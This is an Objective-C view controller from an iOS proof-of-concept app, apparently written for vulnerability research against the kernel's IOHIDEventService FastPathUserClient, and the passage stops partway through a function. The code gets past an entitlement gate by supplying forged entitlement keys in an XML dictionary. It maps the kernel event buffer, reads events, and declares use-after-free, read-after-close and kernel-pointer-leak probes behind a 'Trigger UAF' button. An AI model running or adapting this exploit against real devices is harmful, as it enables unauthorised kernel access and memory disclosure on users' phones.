//
//  ViewController.m
//  TestPOC
//
//  Created by Johnny Franks on 2/12/26.
//

#import "ViewController.h"
#import <dlfcn.h>
#import <mach/mach.h>
#import <mach/mach_error.h>
#import <mach/vm_map.h>
#import <math.h>
#import <sched.h>
#import <stdatomic.h>
#import <sys/time.h>
#import <unistd.h>

// ---------- IOKit type / function-pointer plumbing ----------

typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;
typedef io_object_t io_iterator_t;

typedef CFMutableDictionaryRef (*IOServiceMatchingFn)(const char *name);
typedef io_service_t (*IOServiceGetMatchingServiceFn)(mach_port_t mainPort, CFDictionaryRef matching);
typedef kern_return_t (*IOServiceGetMatchingServicesFn)(mach_port_t mainPort, CFDictionaryRef matching, io_iterator_t *existing);
typedef kern_return_t (*IOServiceOpenFn)(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *connect);
typedef kern_return_t (*IOServiceCloseFn)(io_connect_t connect);
typedef kern_return_t (*IOObjectReleaseFn)(io_object_t object);
typedef io_object_t   (*IOIteratorNextFn)(io_iterator_t iterator);
typedef kern_return_t (*IOConnectCallMethodFn)(
    io_connect_t connection, uint32_t selector,
    const uint64_t *input, uint32_t inputCnt,
    const void *inputStruct, size_t inputStructCnt,
    uint64_t *output, uint32_t *outputCnt,
    void *outputStruct, size_t *outputStructCnt);
typedef kern_return_t (*IOConnectMapMemoryFn)(
    io_connect_t connect, uint32_t memoryType,
    task_port_t intoTask, mach_vm_address_t *atAddress,
    mach_vm_size_t *ofSize, uint32_t options);
typedef kern_return_t (*IOConnectUnmapMemoryFn)(
    io_connect_t connect, uint32_t memoryType,
    task_port_t fromTask, mach_vm_address_t atAddress);
typedef kern_return_t (*IORegistryEntryGetRegistryEntryIDFn)(
    io_object_t entry, uint64_t *entryID);
typedef CFStringRef (*IOObjectCopyClassFn)(io_object_t object);
typedef kern_return_t (*IORegistryEntryGetNameFn)(io_object_t entry, char name[128]);
typedef kern_return_t (*IOConnectGetServiceFn)(io_connect_t connect, io_service_t *service);
typedef kern_return_t (*IORegistryEntryCreateCFPropertiesFn)(
    io_object_t entry, CFMutableDictionaryRef *properties, CFAllocatorRef allocator, uint32_t options);
typedef CFTypeRef (*SecTaskCreateFromSelfFn)(CFAllocatorRef allocator);
typedef CFTypeRef (*SecTaskCopyValueForEntitlementFn)(CFTypeRef task, CFStringRef entitlement, CFErrorRef *error);

static void *sIOKitHandle = NULL;
static IOServiceMatchingFn            sIOServiceMatching            = NULL;
static IOServiceGetMatchingServiceFn  sIOServiceGetMatchingService  = NULL;
static IOServiceGetMatchingServicesFn sIOServiceGetMatchingServices = NULL;
static IOServiceOpenFn                sIOServiceOpen                = NULL;
static IOServiceCloseFn               sIOServiceClose               = NULL;
static IOObjectReleaseFn              sIOObjectRelease              = NULL;
static IOIteratorNextFn               sIOIteratorNext               = NULL;
static IOConnectCallMethodFn          sIOConnectCallMethod          = NULL;
static IOConnectMapMemoryFn           sIOConnectMapMemory64         = NULL;
static IOConnectUnmapMemoryFn         sIOConnectUnmapMemory64       = NULL;
static IORegistryEntryGetRegistryEntryIDFn sIORegistryEntryGetRegistryEntryID = NULL;
static IOObjectCopyClassFn                sIOObjectCopyClass                = NULL;
static IORegistryEntryGetNameFn           sIORegistryEntryGetName           = NULL;
static IOConnectGetServiceFn              sIOConnectGetService              = NULL;
static IORegistryEntryCreateCFPropertiesFn sIORegistryEntryCreateCFProperties = NULL;
static void *sSecurityHandle = NULL;
static SecTaskCreateFromSelfFn sSecTaskCreateFromSelf = NULL;
static SecTaskCopyValueForEntitlementFn sSecTaskCopyValueForEntitlement = NULL;

// ---------- Constants ----------

// Selector indices from the FastPathUserClient dispatch table
static const uint32_t kSelectorOpen      = 0;
static const uint32_t kSelectorClose     = 1;
static const uint32_t kSelectorCopyEvent = 2;

// IOConnectMapMemory type (try type 0 for the event buffer)
static const uint32_t kMemoryTypeEventBuffer = 0;

#define kEventOutputBufferSize 4096U

// Cap for mapped-buffer probe window — never touch more than this.
enum { kMappedProbeMaxBytes = 4096 };
static const size_t kMappedProbeMax = kMappedProbeMaxBytes;
static const size_t kCrossClientSampleBytes = 192;

// ---------- Serialised properties payload ----------
// The fast-path gate (sub_FFFFFE000A6AD844) calls getObject() on the
// *caller-supplied* OSDictionary for these two keys.  If both keys are
// present the gate passes and openForClient is invoked on the provider.
//
// The actual entitlement flags stored during initWithTask are loaded
// but do NOT control the branch – this is the authorization inconsistency
// we are boundary-testing.

static const char kOpenPropertiesXML[] =
    "<dict>"
        "<key>FastPathHasEntitlement</key><true/>"
        "<key>FastPathMotionEventEntitlement</key><true/>"
    "</dict>";

static const char kOpenPropertiesXMLEmpty[] =
    "<dict></dict>";

static const char kOpenPropertiesXMLOneKey[] =
    "<dict>"
        "<key>FastPathHasEntitlement</key><true/>"
    "</dict>";

// Negative controls that should fail if selector 0 truly requires valid caller props.
static const char kOpenPropertiesMalformedXML[] =
    "<dict><key>FastPathHasEntitlement</key><true/>";

static const char kOpenPropertiesGarbage[] =
    "THIS_IS_NOT_XML";

// ---------- ViewController ----------

@interface ViewController () {
    io_connect_t _persistedConnection;
    io_service_t _persistedService;
}
@property (nonatomic, strong) UIButton   *triggerButton;
@property (nonatomic, strong) UIButton   *deepProbeButton;
@property (nonatomic, strong) UIButton   *lifecycleButton;
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, assign) int  proofCrossClientEvents;
@property (nonatomic, assign) int  proofCrossClientChecks;
@property (nonatomic, assign) int  proofTerminationProbes;
@property (nonatomic, assign) int  proofTerminationOpenCycles;
@property (nonatomic, assign) BOOL proofCrossClientSignal;
@property (nonatomic, assign) BOOL proofTermRaceActive;
@property (nonatomic, assign) BOOL proofHashChanged;
@property (nonatomic, assign) BOOL proofKernelPointerPatterns;
@property (nonatomic, assign) double proofEntropyDelta;
@property (nonatomic, assign) int proofFirstCrossClientConn;
@property (nonatomic, assign) uint32_t proofFirstCrossClientEventSize;
@property (nonatomic, strong) NSString *proofFirstCrossClientHex;
@property (nonatomic, strong) NSString *proofArtifactPath;
@property (nonatomic, assign) BOOL proofKernelPointerLeak;
@property (nonatomic, assign) uint64_t proofKernelPointerValue;
@property (nonatomic, assign) int proofKernelPointerOffset;
@property (nonatomic, assign) int proofKernelPointerSourceConn;
@property (nonatomic, strong) NSString *proofKernelPointerHex;
@property (nonatomic, assign) int proofPrimaryScanCount;
@property (nonatomic, assign) int proofPrimaryLeakCount;
@property (nonatomic, assign) int proofZoneFreePatternHits;
@property (nonatomic, assign) int proofUninitLeaks;
@property (nonatomic, assign) int proofReadAfterCloseLeaks;
@property (nonatomic, assign) int proofRemapAfterFreeLeaks;
- (void)clearLifecyclePocState;
- (void)appendPocArtifactEntry:(NSDictionary *)entry;
- (BOOL)isLikelyKernelPointerValue:(uint64_t)value;
- (BOOL)isZeroFilled:(const uint8_t *)bytes length:(size_t)length;
- (BOOL)findCollectionChildChainStart:(const uint8_t *)base
                            totalSize:(size_t)totalSize
                             outStart:(size_t *)outStart
                        outChildCount:(int *)outChildCount
                          outCoverage:(size_t *)outCoverage;
- (BOOL)parseSPUCollectionFrame:(const uint8_t *)eventBytes
                      eventSize:(size_t)eventSize
                     outSummary:(NSString **)outSummary;
- (void)runPhase4BroadServiceEnumeration;
- (void)runPhase5MappedMemoryBoundsAudit:(io_connect_t)connection
                              mappedAddr:(mach_vm_address_t)mappedAddr
                              mappedSize:(mach_vm_size_t)mappedSize;
- (void)runPhase6ExtendedSelectorProbing:(io_connect_t)connection;
- (void)runPhase7RegistryPropertyTraversal:(io_connect_t)connection;
- (void)runPhase8ConnectionPortAnalysis:(io_connect_t)connection;
- (NSString *)labelForService:(io_service_t)service
                     outClass:(NSString **)outClass
                      outName:(NSString **)outName
                  outEntryID:(uint64_t *)outEntryID;
- (NSString *)cfTypeName:(CFTypeRef)value;
- (double)shannonEntropyForBytes:(const uint8_t *)bytes length:(size_t)length;
- (void)runBaselineScan:(io_connect_t)connection
                mappedAddr:(mach_vm_address_t)mappedAddr
                mappedSize:(mach_vm_size_t)mappedSize;
- (int)openMultipleGatedConnections:(io_connect_t *)outConns
                           maxCount:(int)maxCount
                         outService:(io_service_t *)outService;
- (void)runLifecycleDesyncStress:(io_connect_t *)connections
                           count:(int)connCount
                      mappedAddr:(mach_vm_address_t)mappedAddr
                      mappedSize:(mach_vm_size_t)mappedSize
                   auxMappings:(mach_vm_address_t *)auxMappedAddrs
                 auxMappedSizes:(mach_vm_size_t *)auxMappedSizes
                    raceService:(io_service_t)raceService;
- (void)runPostStressStructuralAnalysis:(io_connect_t)connection
                    mappedAddr:(mach_vm_address_t)mappedAddr
                    mappedSize:(mach_vm_size_t)mappedSize
                   preSnapshot:(NSData *)preSnapshot;
- (void)runPostLifecycleFingerprint:(io_connect_t)connection
                         mappedAddr:(mach_vm_address_t)mappedAddr
                         mappedSize:(mach_vm_size_t)mappedSize
                        preEntropy:(double)preEntropy
                           preHash:(uint64_t)preHash
                   primaryScanCount:(int)primaryScanCount
                   primaryLeakCount:(int)primaryLeakCount;
- (NSArray<NSDictionary *> *)scanForKernelPointers:(const uint8_t *)base
                                            length:(size_t)length
                                        maxResults:(int)maxResults
                                         connIndex:(int)connIndex;
- (BOOL)isZoneFreePattern:(uint64_t)value;
- (int)scanForZoneFreePatterns:(const uint8_t *)base length:(size_t)length;
- (void)runReadAfterCloseProbe:(io_connect_t *)connections
                         count:(int)connCount
                    mappedAddr:(mach_vm_address_t)mappedAddr
                    mappedSize:(mach_vm_size_t)mappedSize
                   raceService:(io_service_t)raceService;
- (void)runUninitBufferProbe:(io_service_t)raceService;
- (void)runRemapAfterFreeProbe:(io_service_t)raceService;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    [self setupUI];
}

// ---- UI boilerplate ----

- (void)setupUI {
    self.view.backgroundColor = [UIColor systemBackgroundColor];

    self.lifecycleButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.lifecycleButton.translatesAutoresizingMaskIntoConstraints = NO;
    UIButtonConfiguration *conf = [UIButtonConfiguration filledButtonConfiguration];
    conf.baseBackgroundColor = [UIColor systemRedColor];
    self.lifecycleButton.configuration = conf;
    [self.lifecycleButton setTitle:@"Trigger UAF" forState:UIControlStateNormal];
    [self.lifecycleButton addTarget:self action:@selector(lifecycleBoundaryTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.lifecycleButton];

    self.logView = [[UITextView alloc] initWithFrame:CGRectZero];
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    self.logView.editable = NO;
    self.logView.font = [UIFont monospacedSystemFontOfSize:12.0 weight:UIFontWeightRegular];
    self.logView.backgroundColor = [UIColor secondarySystemBackgroundColor];
    self.logView.text = @"UAF PoC\nPress Trigger UAF to begin.\n";
    [self.view addSubview:self.logView];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [self.lifecycleButton.topAnchor constraintEqualToAnchor:safe.topAnchor constant:20],
        [self.lifecycleButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
        [self.lifecycleButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
        [self.logView.topAnchor constraintEqualToAnchor:self.lifecycleButton.bottomAnchor constant:20],
        [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
        [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-16],
    ]];
}

// ---- Symbol loading ----

- (BOOL)loadIOKitSymbols {
    // Fix #3: gate on ALL required symbols to avoid partial-load cache hit
    if (sIOKitHandle
        && sIOServiceMatching
        && sIOServiceGetMatchingService
        && sIOServiceOpen
        && sIOServiceClose
        && sIOObjectRelease
        && sIOIteratorNext
        && sIOConnectCallMethod) {
        return YES;
    }

    if (!sIOKitHandle) {
        sIOKitHandle = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW | RTLD_LOCAL);
    }
    if (!sIOKitHandle) return NO;

    sIOServiceMatching            = (IOServiceMatchingFn)           dlsym(sIOKitHandle, "IOServiceMatching");
    sIOServiceGetMatchingService  = (IOServiceGetMatchingServiceFn) dlsym(sIOKitHandle, "IOServiceGetMatchingService");
    sIOServiceGetMatchingServices = (IOServiceGetMatchingServicesFn)dlsym(sIOKitHandle, "IOServiceGetMatchingServices");
    sIOServiceOpen                = (IOServiceOpenFn)               dlsym(sIOKitHandle, "IOServiceOpen");
    sIOServiceClose               = (IOServiceCloseFn)              dlsym(sIOKitHandle, "IOServiceClose");
    sIOObjectRelease              = (IOObjectReleaseFn)             dlsym(sIOKitHandle, "IOObjectRelease");
    sIOIteratorNext               = (IOIteratorNextFn)              dlsym(sIOKitHandle, "IOIteratorNext");
    sIOConnectCallMethod          = (IOConnectCallMethodFn)         dlsym(sIOKitHandle, "IOConnectCallMethod");
    sIOConnectMapMemory64         = (IOConnectMapMemoryFn)          dlsym(sIOKitHandle, "IOConnectMapMemory64");
    sIOConnectUnmapMemory64       = (IOConnectUnmapMemoryFn)       dlsym(sIOKitHandle, "IOConnectUnmapMemory64");
    sIORegistryEntryGetRegistryEntryID = (IORegistryEntryGetRegistryEntryIDFn)dlsym(sIOKitHandle, "IORegistryEntryGetRegistryEntryID");
    sIOObjectCopyClass     = (IOObjectCopyClassFn)    dlsym(sIOKitHandle, "IOObjectCopyClass");
    sIORegistryEntryGetName = (IORegistryEntryGetNameFn)dlsym(sIOKitHandle, "IORegistryEntryGetName");
    sIOConnectGetService = (IOConnectGetServiceFn)dlsym(sIOKitHandle, "IOConnectGetService");
    sIORegistryEntryCreateCFProperties =
        (IORegistryEntryCreateCFPropertiesFn)dlsym(sIOKitHandle, "IORegistryEntryCreateCFProperties");

    return sIOServiceMatching
        && sIOServiceGetMatchingService
        && sIOServiceOpen
        && sIOServiceClose
        && sIOObjectRelease
        && sIOIteratorNext
        && sIOConnectCallMethod;
}

- (BOOL)loadSecuritySymbols {
    if (sSecurityHandle && sSecTaskCreateFromSelf && sSecTaskCopyValueForEntitlement) {
        return YES;
    }

    if (!sSecurityHandle) {
        sSecurityHandle = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW | RTLD_LOCAL);
    }
    if (!sSecurityHandle) return NO;

    sSecTaskCreateFromSelf = (SecTaskCreateFromSelfFn)dlsym(sSecurityHandle, "SecTaskCreateFromSelf");
    sSecTaskCopyValueForEntitlement =
        (SecTaskCopyValueForEntitlementFn)dlsym(sSecurityHandle, "SecTaskCopyValueForEntitlement");
    return sSecTaskCreateFromSelf && sSecTaskCopyValueForEntitlement;
}

// ---- Main flow ----

- (void)triggerTapped {
    [self appendLog:@"\n========== Boundary Test =========="];

    if (![self loadIOKitSymbols]) {
        [self appendLog:@"FAIL: could not load IOKit symbols."];
        return;
    }

    // Run controls first on isolated connections, then keep only the candidate connection.
    [self appendLog:@"\n--- Step 1: selector 0 controls + candidate (isolated connections) ---"];
    kern_return_t krEmpty = [self probeOpenVariantXML:kOpenPropertiesXMLEmpty
                                                label:@"selector 0 probe (empty dict)"
                                       keepConnection:NO
                                  runPreOpenCopyProbe:NO
                                        outPreCopyKr:NULL
                                  outPreCopyNonZero:NULL
                                        outConnection:NULL];
    kern_return_t krOneKey = [self probeOpenVariantXML:kOpenPropertiesXMLOneKey
                                                 label:@"selector 0 probe (one key)"
                                        keepConnection:NO
                                   runPreOpenCopyProbe:NO
                                         outPreCopyKr:NULL
                                   outPreCopyNonZero:NULL
                                         outConnection:NULL];
    kern_return_t krMalformed = [self probeOpenVariantXML:kOpenPropertiesMalformedXML
                                                    label:@"selector 0 probe (malformed XML)"
                                           keepConnection:NO
                                      runPreOpenCopyProbe:NO
                                            outPreCopyKr:NULL
                                      outPreCopyNonZero:NULL
                                            outConnection:NULL];
    kern_return_t krGarbage = [self probeOpenVariantXML:kOpenPropertiesGarbage
                                                  label:@"selector 0 probe (garbage blob)"
                                         keepConnection:NO
                                    runPreOpenCopyProbe:NO
                                          outPreCopyKr:NULL
                                    outPreCopyNonZero:NULL
                                          outConnection:NULL];

    io_connect_t connection = MACH_PORT_NULL;
    kern_return_t preCopyKr = KERN_FAILURE;
    BOOL preCopyNonZero = NO;
    kern_return_t kr = [self probeOpenVariantXML:kOpenPropertiesXML
                                           label:@"selector 0 candidate (both keys)"
                                  keepConnection:YES
                            runPreOpenCopyProbe:YES
                                  outPreCopyKr:&preCopyKr
                            outPreCopyNonZero:&preCopyNonZero
                                   outConnection:&connection];

    BOOL anyControlSucceeded = (krEmpty == KERN_SUCCESS
                                || krOneKey == KERN_SUCCESS
                                || krMalformed == KERN_SUCCESS
                                || krGarbage == KERN_SUCCESS);
    if (kr == KERN_SUCCESS && !anyControlSucceeded) {
        [self appendLog:@"INTERESTING: controls failed while candidate succeeded (strong boundary-test signal)."];
    } else if (kr == KERN_SUCCESS) {
        [self appendLog:@"INCONCLUSIVE: candidate succeeded, but at least one control also succeeded."];
        if (krMalformed == KERN_SUCCESS || krGarbage == KERN_SUCCESS) {
            [self appendLog:@"HIGH SIGNAL: selector 0 accepted malformed/garbage properties."];
        }
    }

    if (kr != KERN_SUCCESS) {
        [self appendLog:@"Gate did not pass. Cleaning up."];
        if (connection != MACH_PORT_NULL) {
            sIOServiceClose(connection);
        }
        return;
    }

    [self appendLog:[NSString stringWithFormat:@"Using candidate connection 0x%x for copyEvent checks.", connection]];
    [self appendLog:[NSString stringWithFormat:@"Pre-open baseline copyEvent: kr=0x%x (%s), nonZeroStruct=%@",
                     preCopyKr,
                     mach_error_string(preCopyKr),
                     preCopyNonZero ? @"YES" : @"NO"]];

    // -- Step 2: map shared memory for event buffer --
    [self appendLog:@"\n--- Step 2: IOConnectMapMemory64 (type=0) ---"];
    mach_vm_address_t mappedAddr = 0;
    mach_vm_size_t    mappedSize = 0;
    kr = [self mapEventBuffer:connection address:&mappedAddr size:&mappedSize];
    [self logKernReturn:kr label:@"IOConnectMapMemory64"];

    BOOL haveMappedBuffer = (kr == KERN_SUCCESS && mappedAddr != 0 && mappedSize > 0);
    if (haveMappedBuffer) {
        [self appendLog:[NSString stringWithFormat:@"Mapped %llu bytes at 0x%llx", mappedSize, mappedAddr]];
    } else {
        [self appendLog:@"No mapped buffer — will still attempt copyEvent via struct output."];
    }

    // -- Step 3: selector 2 (copyEvent) attempts --
    [self appendLog:@"\n--- Step 3: selector 2 (copyEvent) ---"];
    BOOL sawPostNonZeroStruct = NO;
    BOOL sawPostMappedSignal = NO;
    [self tryCopyEvent:connection
            mappedAddr:mappedAddr
            mappedSize:mappedSize
             haveMapped:haveMappedBuffer
      outSawNonZeroStruct:&sawPostNonZeroStruct
      outSawMappedSignal:&sawPostMappedSignal];

    if (!preCopyNonZero && (sawPostNonZeroStruct || sawPostMappedSignal)) {
        [self appendLog:@"STATE TRANSITION: pre-open copyEvent had no non-zero output, post-open did (strong boundary signal)."];
    } else if (preCopyNonZero == sawPostNonZeroStruct) {
        [self appendLog:@"No clear copyEvent struct-output transition observed across selector 0 boundary."];
    }

    // Compact run summary for report notes.
    [self appendLog:@"\n--- Report Bundle ---"];
    [self appendLog:[NSString stringWithFormat:@"bundle=%@ ios=%@",
                     NSBundle.mainBundle.bundleIdentifier ?: @"<nil>",
                     UIDevice.currentDevice.systemVersion ?: @"<nil>"]];
    [self appendLog:[NSString stringWithFormat:
                     @"selector0 results: empty=0x%x oneKey=0x%x malformed=0x%x garbage=0x%x candidate=0x%x",
                     krEmpty, krOneKey, krMalformed, krGarbage, kr]];
    [self appendLog:[NSString stringWithFormat:
                     @"copyEvent boundary: preOpen=0x%x postStructSignal=%@ postMappedSignal=%@",
                     preCopyKr,
                     sawPostNonZeroStruct ? @"YES" : @"NO",
                     sawPostMappedSignal ? @"YES" : @"NO"]];
    [self appendEntitlementReport];

    // -- Step 4: close and unmap --
    [self appendLog:@"\n--- Step 4: cleanup ---"];
    // Unmap first while the user client is still open.
    if (haveMappedBuffer && sIOConnectUnmapMemory64) {
        kern_return_t unmapKr = sIOConnectUnmapMemory64(connection, kMemoryTypeEventBuffer,
                                                        mach_task_self(), mappedAddr);
        [self logKernReturn:unmapKr label:@"IOConnectUnmapMemory64"];
        if (unmapKr != KERN_SUCCESS) {
            kern_return_t deallocKr = vm_deallocate(mach_task_self(),
                                                    (vm_address_t)mappedAddr,
                                                    (vm_size_t)mappedSize);
            [self logKernReturn:deallocKr label:@"Fallback vm_deallocate"];
        }
    } else if (haveMappedBuffer) {
        // Fallback: deallocate the VM region directly
        kern_return_t deallocKr = vm_deallocate(mach_task_self(),
                                                (vm_address_t)mappedAddr,
                                                (vm_size_t)mappedSize);
        [self logKernReturn:deallocKr label:@"Fallback vm_deallocate"];
    }

    uint64_t closeScalar = 0;
    kr = sIOConnectCallMethod(connection, kSelectorClose, &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
    [self logKernReturn:kr label:@"selector 1 (close)"];

    sIOServiceClose(connection);
    [self appendLog:@"\n========== Done =========="];
}

// ---- Fast-path open (selector 0) ----

- (kern_return_t)fastPathOpen:(io_connect_t)connection propertiesXML:(const char *)propertiesXML {
    // Selector 0 dispatch entry:
    //   scalarInputCnt  = 1   (service index)
    //   structInputSize = -1  (any — XML-serialised OSDictionary)
    //
    // The kernel calls OSUnserializeXML on the struct input, then
    // checks getObject("FastPathHasEntitlement") and
    // getObject("FastPathMotionEventEntitlement") on the resulting
    // dictionary.  Both keys must be present to pass the gate.

    uint64_t scalarIn = 0; // service index / event-service ordinal

    // The struct input is a null-terminated XML plist string.
    const char *xml = propertiesXML ?: kOpenPropertiesXMLEmpty;
    const void *structIn  = xml;
    size_t structInSize   = strlen(xml) + 1; // include null terminator

    kern_return_t kr = sIOConnectCallMethod(
        connection,
        kSelectorOpen,
        &scalarIn, 1,            // 1 scalar input
        structIn, structInSize,  // struct input (XML plist)
        NULL, NULL,              // no scalar output
        NULL, NULL               // no struct output
    );
    return kr;
}

- (kern_return_t)probeOpenVariantXML:(const char *)propertiesXML
                               label:(NSString *)label
                      keepConnection:(BOOL)keepConnection
                 runPreOpenCopyProbe:(BOOL)runPreOpenCopyProbe
                         outPreCopyKr:(kern_return_t *)outPreCopyKr
                   outPreCopyNonZero:(BOOL *)outPreCopyNonZero
                       outConnection:(io_connect_t *)outConnection {
    if (outConnection) {
        *outConnection = MACH_PORT_NULL;
    }
    if (outPreCopyKr) {
        *outPreCopyKr = KERN_FAILURE;
    }
    if (outPreCopyNonZero) {
        *outPreCopyNonZero = NO;
    }

    // Probe across all IOHIDEventService instances so a busy instance does not block the test.
    if (!sIOServiceGetMatchingServices || !sIOIteratorNext) {
        [self appendLog:[NSString stringWithFormat:@"%@: setup failed 0x%x (%s)",
                         label, KERN_NOT_SUPPORTED, "iterator symbols unavailable"]];
        return KERN_NOT_SUPPORTED;
    }

    CFMutableDictionaryRef matching = sIOServiceMatching("IOHIDEventService");
    if (!matching) {
        [self appendLog:[NSString stringWithFormat:@"%@: setup failed 0x%x (%s)",
                         label, KERN_INVALID_ARGUMENT, "IOServiceMatching failed"]];
        return KERN_INVALID_ARGUMENT;
    }

    io_iterator_t iter = MACH_PORT_NULL;
    kern_return_t iterKr = sIOServiceGetMatchingServices(MACH_PORT_NULL, matching, &iter);
    if (iterKr != KERN_SUCCESS || iter == MACH_PORT_NULL) {
        [self appendLog:[NSString stringWithFormat:@"%@: setup failed 0x%x (%s)",
                         label, iterKr, mach_error_string(iterKr)]];
        return (iterKr == KERN_SUCCESS ? KERN_NOT_FOUND : iterKr);
    }

    kern_return_t lastKr = KERN_NOT_FOUND;
    uint32_t idx = 0;
    io_service_t service = MACH_PORT_NULL;

    while ((service = sIOIteratorNext(iter)) != MACH_PORT_NULL) {
        idx++;
        uint64_t entryID = 0;
        BOOL hasEntryID = NO;
        if (sIORegistryEntryGetRegistryEntryID) {
            hasEntryID = (sIORegistryEntryGetRegistryEntryID(service, &entryID) == KERN_SUCCESS);
        }

        // Query service class and registry name before opening (service is still valid).
        NSString *serviceClass = nil;
        NSString *serviceName = nil;
        if (sIOObjectCopyClass) {
            CFStringRef cfClass = sIOObjectCopyClass(service);
            if (cfClass) {
                serviceClass = [(__bridge NSString *)cfClass copy];
                CFRelease(cfClass);
            }
        }
        if (sIORegistryEntryGetName) {
            char nameBuf[128] = {0};
            if (sIORegistryEntryGetName(service, nameBuf) == KERN_SUCCESS && nameBuf[0]) {
                serviceName = [NSString stringWithUTF8String:nameBuf];
            }
        }

        io_connect_t probeConnection = MACH_PORT_NULL;
        kern_return_t openKr = sIOServiceOpen(service, mach_task_self_, 2, &probeConnection);
        sIOObjectRelease(service);

        NSMutableString *instanceLabel = [NSMutableString stringWithFormat:@"instance#%u", idx];
        if (hasEntryID)    [instanceLabel appendFormat:@" entryID=0x%llx", entryID];
        if (serviceClass)  [instanceLabel appendFormat:@" class=%@", serviceClass];
        if (serviceName)   [instanceLabel appendFormat:@" name=%@", serviceName];

        if (openKr != KERN_SUCCESS || probeConnection == MACH_PORT_NULL) {
            lastKr = openKr;
            [self appendLog:[NSString stringWithFormat:@"%@ [%@] open failed 0x%x (%s)",
                             label, instanceLabel, openKr, mach_error_string(openKr)]];
            continue;
        }

        kern_return_t preCopyKr = KERN_FAILURE;
        BOOL preCopyNonZero = NO;
        if (runPreOpenCopyProbe) {
            preCopyKr = [self singleCopyEventProbe:probeConnection
                                             label:[NSString stringWithFormat:@"%@ pre-open copyEvent [%@]", label, instanceLabel]
                                    outSawNonZero:&preCopyNonZero];
        }

        kern_return_t kr = [self fastPathOpen:probeConnection propertiesXML:propertiesXML];
        [self logKernReturn:kr label:[NSString stringWithFormat:@"%@ [%@]", label, instanceLabel]];

        if (kr == KERN_SUCCESS && keepConnection) {
            if (outConnection) {
                *outConnection = probeConnection;
            } else {
                sIOServiceClose(probeConnection);
            }
            if (outPreCopyKr) {
                *outPreCopyKr = preCopyKr;
            }
            if (outPreCopyNonZero) {
                *outPreCopyNonZero = preCopyNonZero;
            }
            sIOObjectRelease(iter);
            return kr;
        }

        if (kr == KERN_SUCCESS) {
            uint64_t closeScalar = 0;
            kern_return_t closeKr = sIOConnectCallMethod(probeConnection, kSelectorClose, &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
            [self logKernReturn:closeKr label:[NSString stringWithFormat:@"%@ -> selector 1 (close) [%@]", label, instanceLabel]];
            sIOServiceClose(probeConnection);
            sIOObjectRelease(iter);
            return kr;
        }

        lastKr = kr;
        sIOServiceClose(probeConnection);
    }

    sIOObjectRelease(iter);
    return lastKr;
}

// ---- Map shared event buffer ----

- (kern_return_t)mapEventBuffer:(io_connect_t)connection
                        address:(mach_vm_address_t *)outAddr
                           size:(mach_vm_size_t *)outSize {
    if (!sIOConnectMapMemory64) {
        [self appendLog:@"IOConnectMapMemory64 symbol not available."];
        return KERN_FAILURE;
    }

    *outAddr = 0;
    *outSize = 0;

    // kIOMapAnywhere = 1
    kern_return_t kr = sIOConnectMapMemory64(
        connection,
        kMemoryTypeEventBuffer,
        mach_task_self(),
        outAddr,
        outSize,
        1 /* kIOMapAnywhere */
    );
    return kr;
}

- (kern_return_t)singleCopyEventProbe:(io_connect_t)connection
                                 label:(NSString *)label
                        outSawNonZero:(BOOL *)outSawNonZero {
    if (outSawNonZero) {
        *outSawNonZero = NO;
    }

    uint64_t scalarsIn[2] = { 0, 1 /* no filter */ };
    uint8_t structOut[kEventOutputBufferSize];
    memset(structOut, 0xA5, sizeof(structOut));
    size_t structOutSize = sizeof(structOut);

    kern_return_t kr = sIOConnectCallMethod(
        connection,
        kSelectorCopyEvent,
        scalarsIn, 2,
        NULL, 0,
        NULL, NULL,
        structOut, &structOutSize
    );

    size_t checkLen = MIN(structOutSize, sizeof(structOut));
    BOOL modified = (checkLen > 0) && [self bufferModified:structOut sentinel:0xA5 length:checkLen];
    BOOL nonZero = modified && [self bufferHasAnyNonZero:structOut length:checkLen];
    if (outSawNonZero && nonZero) {
        *outSawNonZero = YES;
    }

    [self appendLog:[NSString stringWithFormat:@"%@: kr=0x%x (%s) structOutSize=%zu nonZeroStruct=%@",
                     label, kr, mach_error_string(kr), structOutSize, nonZero ? @"YES" : @"NO"]];
    if (modified && !nonZero) {
        [self appendLog:@"  NOTE: pre-open struct output changed but remained zero-filled."];
    }

    return kr;
}

// ---- CopyEvent (selector 2) ----

- (void)tryCopyEvent:(io_connect_t)connection
          mappedAddr:(mach_vm_address_t)mappedAddr
          mappedSize:(mach_vm_size_t)mappedSize
          haveMapped:(BOOL)haveMapped
   outSawNonZeroStruct:(BOOL *)outSawNonZeroStruct
    outSawMappedSignal:(BOOL *)outSawMappedSignal {

    if (outSawNonZeroStruct) {
        *outSawNonZeroStruct = NO;
    }
    if (outSawMappedSignal) {
        *outSawMappedSignal = NO;
    }

    // Selector 2 dispatch entry:
    //   scalarInputCnt   = 2   [eventIndex, filterMode]
    //   structInputSize  = -1  (optional filter dict)
    //   scalarOutputCnt  = 0
    //   structOutputSize = -1  (event data via struct output)
    //
    // filterMode: 0 = use struct input as filter dict,
    //             1 = no filter (empty dict)

    // Fix #1: cap the probe window and treat mapped region as read-only.
    // The kernel writes into it; we only read to detect changes.
    // Take a read-only snapshot of the first kMappedProbeMax bytes
    // before each call, then compare after.
    size_t probeLen = 0;
    uint8_t *preSnapshot = NULL;
    if (haveMapped && mappedAddr && mappedSize > 0) {
        probeLen = MIN((size_t)mappedSize, kMappedProbeMax);
        preSnapshot = (uint8_t *)malloc(probeLen);
    }

    static const uint32_t kCopyEventProbeIters = 4;
    uint8_t prevStructPreview[32] = {0};
    BOOL havePrevStructPreview = NO;
